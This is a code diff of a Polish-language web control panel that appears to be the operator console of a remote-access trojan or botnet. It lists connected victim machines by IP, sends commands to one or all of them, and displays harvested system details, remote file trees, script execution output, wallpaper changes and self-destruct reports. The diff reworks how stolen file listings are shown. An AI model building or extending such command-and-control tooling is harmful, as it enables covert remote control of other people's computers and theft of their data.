@@ -60,9 +60,6 @@
             border: 1px solid transparent;
             cursor: pointer;
             transition: background-color 0.3s, border-color 0.3s;
-            display: flex;
-            flex-direction: column;
-            gap: 5px;
         }
 
         .client-item.active {
@@ -75,7 +72,7 @@
         }
 
         .client-item h3 {
-            margin: 0;
+            margin: 0 0 5px 0;
             color: var(--green);
         }
 
@@ -93,18 +90,15 @@
             color: var(--text-color);
         }
 
-        .command-panel button, .client-action-btn {
+        .command-panel button {
             background-color: var(--primary-color);
             border: none;
             cursor: pointer;
             font-weight: bold;
             transition: background-color 0.3s;
-            padding: 10px;
-            border-radius: 5px;
-            margin-top: 10px;
         }
 
-        .command-panel button:hover, .client-action-btn:hover {
+        .command-panel button:hover {
             background-color: #0088cc;
         }
 
@@ -148,102 +142,12 @@
             flex-grow: 1;
         }
 
-        /* File Explorer Modal */
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 100;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            overflow: auto;
-            background-color: rgba(0,0,0,0.8);
-            backdrop-filter: blur(5px);
-        }
-
-        .modal-content {
-            background-color: var(--card-bg);
-            margin: 5% auto;
-            padding: 20px;
-            border: 1px solid var(--secondary-color);
-            width: 80%;
-            max-width: 700px;
-            border-radius: 10px;
-            position: relative;
-            max-height: 80vh;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .modal-close {
-            color: #aaa;
-            position: absolute;
-            top: 10px;
-            right: 20px;
-            font-size: 28px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-
-        .modal-close:hover, .modal-close:focus {
-            color: var(--red);
-            text-decoration: none;
-        }
-
-        .file-tree-container {
-            margin-top: 20px;
-            padding-right: 15px;
-            overflow-y: auto;
-        }
-
-        .file-tree-container ul {
-            list-style-type: none;
-            padding-left: 15px;
-        }
-
-        .file-tree-container ul li {
-            position: relative;
-            margin-bottom: 5px;
-            cursor: pointer;
-        }
-
-        .file-tree-container ul li.directory::before {
-            content: '📂';
-            margin-right: 5px;
-        }
-
-        .file-tree-container ul li.file::before {
-            content: '📄';
-            margin-right: 5px;
-        }
-
-        .file-tree-container ul li.file-exe::before { content: '⚙️'; }
-        .file-tree-container ul li.file-zip::before { content: '📦'; }
-        .file-tree-container ul li.file-img::before { content: '🖼️'; }
-        .file-tree-container ul li.file-txt::before { content: '📝'; }
-        .file-tree-container ul li.file-pdf::before { content: '📄'; }
-
-        .file-tree-container .folder-name {
-            font-weight: bold;
-        }
-
-        .file-tree-container .file-size {
-            font-size: 0.8em;
-            color: #888;
-            margin-left: 10px;
-        }
-
         @media (max-width: 768px) {
             .container {
                 padding: 10px;
             }
             .form-group.row {
                 flex-direction: column;
-            }
-            .modal-content {
-                width: 95%;
-                margin: 5% auto;
             }
         }
     </style>
@@ -296,16 +200,6 @@
         </div>
     </div>
 
-    <div id="file-explorer-modal" class="modal">
-        <div class="modal-content">
-            <span class="modal-close">&times;</span>
-            <h2 id="modal-title">Struktura Plików</h2>
-            <div class="file-tree-container">
-                <div id="file-tree"></div>
-            </div>
-        </div>
-    </div>
-
     <script>
         const API_URL = window.location.origin;
 
@@ -315,15 +209,8 @@
         const sendCommandBtn = document.getElementById('send-command-btn');
         const extraDataGroup = document.getElementById('extra-data-group');
         const extraDataInput = document.getElementById('extra-data-input');
+        
         const reportOutput = document.getElementById('report-output');
-
-        const fileExplorerModal = document.getElementById('file-explorer-modal');
-        const fileTreeDiv = document.getElementById('file-tree');
-        const modalTitle = document.getElementById('modal-title');
-        const modalCloseBtn = document.querySelector('.modal-close');
-
-        // Global state to store file tree data
-        let clientFileTrees = {};
 
         function logMessage(message, colorClass = 'log-white') {
             const logEntry = document.createElement('pre');
@@ -339,46 +226,29 @@
                 if (!response.ok) throw new Error('Network response was not ok');
                 const clients = await response.json();
                 
-                // Save the currently selected client
-                const selectedClient = commandClientSelect.value;
-
                 clientListDiv.innerHTML = '';
                 commandClientSelect.innerHTML = '<option value="all">Wszyscy klienci</option>';
 
                 if (Object.keys(clients).length === 0) {
                     clientListDiv.innerHTML = '<p>Brak podłączonych klientów.</p>';
-                } else {
-                    for (const ip in clients) {
-                        const details = clients[ip];
-                        const lastSeen = new Date(details.last_seen * 1000).toLocaleString();
-                        
-                        const clientItem = document.createElement('div');
-                        clientItem.className = 'client-item';
-                        clientItem.innerHTML = `<h3>${ip} <span style="font-size:0.8em; color:#888;">(v${details.version})</span></h3>
-                                                <p>Status: ${details.status}</p>
-                                                <p>Ostatnio widziany: ${lastSeen}</p>`;
-                        
-                        // Add 'Przeglądaj pliki' button if file tree data exists for this client
-                        if (clientFileTrees[ip]) {
-                            const browseBtn = document.createElement('button');
-                            browseBtn.className = 'client-action-btn';
-                            browseBtn.textContent = 'Przeglądaj pliki';
-                            browseBtn.onclick = () => showFileExplorer(ip);
-                            clientItem.appendChild(browseBtn);
-                        }
-                                                
-                        clientListDiv.appendChild(clientItem);
-
-                        const option = document.createElement('option');
-                        option.value = ip;
-                        option.textContent = ip;
-                        commandClientSelect.appendChild(option);
-                    }
+                    return;
                 }
-                
-                // Restore the selected client if it still exists
-                if (clients[selectedClient]) {
-                    commandClientSelect.value = selectedClient;
+
+                for (const ip in clients) {
+                    const details = clients[ip];
+                    const lastSeen = new Date(details.last_seen * 1000).toLocaleString();
+                    
+                    const clientItem = document.createElement('div');
+                    clientItem.className = 'client-item';
+                    clientItem.innerHTML = `<h3>${ip} <span style="font-size:0.8em; color:#888;">(v${details.version})</span></h3>
+                                            <p>Status: ${details.status}</p>
+                                            <p>Ostatnio widziany: ${lastSeen}</p>`;
+                    clientListDiv.appendChild(clientItem);
+
+                    const option = document.createElement('option');
+                    option.value = ip;
+                    option.textContent = ip;
+                    commandClientSelect.appendChild(option);
                 }
             } catch (error) {
                 clientListDiv.innerHTML = `<p style="color:var(--red);">Błąd: Nie można połączyć się z serwerem API. ${error.message}</p>`;
@@ -425,7 +295,7 @@
                 body.client_ip = clientIP;
             }
 
-            logMessage(`[SERWER] Wysyłanie komendy '${commandType}' do ${clientIP === 'all' ? 'wszystkich klientów' : clientIP}...`, 'log-server');
+            logMessage(`[SERVER] Wysyłanie komendy '${commandType}' do ${clientIP === 'all' ? 'wszystkich klientów' : clientIP}...`, 'log-server');
 
             try {
                 const response = await fetch(`${API_URL}${endpoint}`, {
@@ -436,9 +306,50 @@
                 if (!response.ok) throw new Error('Failed to send command');
                 
                 const result = await response.json();
-                logMessage(`[SERWER] ${result.message}`, 'log-green');
+                logMessage(`[SERVER] ${result.message}`, 'log-green');
             } catch (error) {
-                logMessage(`[SERWER] Błąd: Nie można wysłać polecenia. ${error.message}`, 'log-red');
+                logMessage(`[SERVER] Błąd: Nie można wysłać polecenia. ${error.message}`, 'log-red');
+            }
+        }
+        
+        // Funkcja pomocnicza do rekurencyjnego tworzenia elementów drzewa plików
+        function createTreeView(fileTree, parentElement) {
+            for (const name in fileTree) {
+                const item = fileTree[name];
+                const itemDiv = document.createElement('div');
+                itemDiv.style.marginLeft = '15px';
+                
+                if (item.type === 'directory') {
+                    const folderSpan = document.createElement('span');
+                    folderSpan.textContent = `▶️ ${name}/`;
+                    folderSpan.style.cursor = 'pointer';
+                    folderSpan.style.color = 'var(--cyan)';
+                    
+                    const contentsDiv = document.createElement('div');
+                    contentsDiv.style.display = 'none'; // Domyślnie ukryte
+                    
+                    folderSpan.onclick = () => {
+                        if (contentsDiv.style.display === 'none') {
+                            contentsDiv.style.display = 'block';
+                            folderSpan.textContent = `▼ ${name}/`;
+                        } else {
+                            contentsDiv.style.display = 'none';
+                            folderSpan.textContent = `▶️ ${name}/`;
+                        }
+                    };
+                    
+                    itemDiv.appendChild(folderSpan);
+                    itemDiv.appendChild(contentsDiv);
+                    createTreeView(item.contents, contentsDiv);
+                    
+                } else if (item.type === 'file') {
+                    const fileSpan = document.createElement('span');
+                    fileSpan.textContent = `📄 ${name} (${(item.size_bytes / 1024).toFixed(2)} KB)`;
+                    fileSpan.style.color = 'var(--green)';
+                    itemDiv.appendChild(fileSpan);
+                }
+                
+                parentElement.appendChild(itemDiv);
             }
         }
 
@@ -463,14 +374,32 @@
                             break;
                         case 'system-info-complete':
                             logClass = 'log-magenta';
-                            logMessage = `[RAPORT] [${report.client_ip}] [INFO SYSTEMOWE] Zgromadzone dane:\n  • System operacyjny: ${report.info.os}\n  • Katalog domowy: ${report.info.home_directory}\n  • Zainstalowane programy: ${report.info.installed_programs.slice(0, 5).join(', ')}...`;
+                            let infoMsg = `[RAPORT] [${report.client_ip}] [INFO SYSTEMOWE] Zgromadzone dane:\n`;
+                            infoMsg += `  • System operacyjny: ${report.info.os}\n`;
+                            infoMsg += `  • Katalog domowy: ${report.info.home_directory}\n`;
+                            if (report.info.disks) {
+                                infoMsg += `  • Dostępne dyski: ${report.info.disks.join(', ')}\n`;
+                            }
+                            infoMsg += `  • Zainstalowane programy: ${report.info.installed_programs.slice(0, 5).join(', ')}...`;
+                            logMessage = infoMsg;
                             break;
                         case 'file-list-complete':
                             logClass = 'log-blue';
-                            logMessage = `[RAPORT] [${report.client_ip}] -> Struktura plików dla ścieżki '${report.info.path}' została pobrana.`;
-                            clientFileTrees[report.client_ip] = report.info;
-                            fetchClients(); // Refresh client list to show 'Przeglądaj' button
-                            break;
+                            const fileListHeader = `[RAPORT] [${report.client_ip}] -> Lista plików dla ścieżki '${report.info.path}':`;
+                            
+                            const logContainer = document.createElement('pre');
+                            logContainer.className = `log-entry ${logClass}`;
+                            logContainer.textContent = `[${new Date(report.time * 1000).toLocaleTimeString()}] ${fileListHeader}\n`;
+                            
+                            if (report.info.file_tree && !report.info.file_tree.error) {
+                                 createTreeView(report.info.file_tree, logContainer);
+                            } else {
+                                logContainer.textContent += `Błąd: ${report.info.file_tree.error || "Nie można wyświetlić drzewa plików."}`;
+                            }
+
+                            reportOutput.appendChild(logContainer);
+                            reportOutput.scrollTop = reportOutput.scrollHeight;
+                            return; // Zakończ, bo używamy niestandardowego renderowania
                         case 'script-output':
                             logClass = 'log-yellow';
                             logMessage = `[RAPORT] [${report.client_ip}] -> Wynik wykonania skryptu:\n${report.info.output}`;
@@ -481,9 +410,8 @@
                             logMessage = `[RAPORT] [${report.client_ip}] -> ${report.status.replace(/-/g, ' ')}`;
                             break;
                         case 'wallpaper-change-error':
-                        case 'file-transfer-error':
                             logClass = 'log-red';
-                            logMessage = `[RAPORT] [${report.client_ip}] -> Błąd: ${report.info.error}`;
+                            logMessage = `[RAPORT] [${report.client_ip}] -> Błąd zmiany tapety: ${report.info.error}`;
                             break;
                         case 'self-destruct':
                             logClass = 'log-red';
@@ -510,68 +438,9 @@
             }
         }
 
-        // Functions for the file explorer modal
-        function showFileExplorer(ip) {
-            const clientData = clientFileTrees[ip];
-            if (!clientData) {
-                alert('Brak danych o plikach dla tego klienta. Proszę wysłać komendę "Wyświetl pliki" najpierw.');
-                return;
-            }
-            modalTitle.textContent = `Struktura Plików dla: ${ip} (Ścieżka: ${clientData.path})`;
-            fileTreeDiv.innerHTML = '';
-            const rootUl = document.createElement('ul');
-            renderFileTree(clientData.file_tree, rootUl);
-            fileTreeDiv.appendChild(rootUl);
-            fileExplorerModal.style.display = 'block';
-        }
-
-        function renderFileTree(tree, parentElement) {
-            for (const key in tree) {
-                const item = tree[key];
-                const li = document.createElement('li');
-                
-                if (item.type === 'directory') {
-                    li.className = 'directory';
-                    li.innerHTML = `<span class="folder-name">${key}</span>`;
-                    const subUl = document.createElement('ul');
-                    li.appendChild(subUl);
-                    renderFileTree(item.contents, subUl);
-                } else if (item.type === 'file') {
-                    const extension = key.split('.').pop().toLowerCase();
-                    let fileClass = 'file';
-                    
-                    switch(extension) {
-                        case 'exe': case 'bat': case 'sh': fileClass += ' file-exe'; break;
-                        case 'zip': case 'rar': case '7z': fileClass += ' file-zip'; break;
-                        case 'jpg': case 'jpeg': case 'png': case 'gif': fileClass += ' file-img'; break;
-                        case 'txt': case 'log': fileClass += ' file-txt'; break;
-                        case 'pdf': fileClass += ' file-pdf'; break;
-                    }
-
-                    const sizeInKB = (item.size_bytes / 1024).toFixed(2);
-                    li.className = fileClass;
-                    li.innerHTML = `${key} <span class="file-size">(${sizeInKB} KB)</span>`;
-                }
-                
-                parentElement.appendChild(li);
-            }
-        }
-
-        function closeFileExplorer() {
-            fileExplorerModal.style.display = 'none';
-        }
-
         // Event Listeners
         commandTypeSelect.addEventListener('change', checkExtraDataVisibility);
         sendCommandBtn.addEventListener('click', sendCommand);
-        modalCloseBtn.addEventListener('click', closeFileExplorer);
-
-        // Close modal when clicking outside of it
-        window.onclick = (event) => {
-            if (event.target === fileExplorerModal) {
-                closeFileExplorer();
-            }
-        };
 
         // Initial calls
         checkExtraDataVisibility();
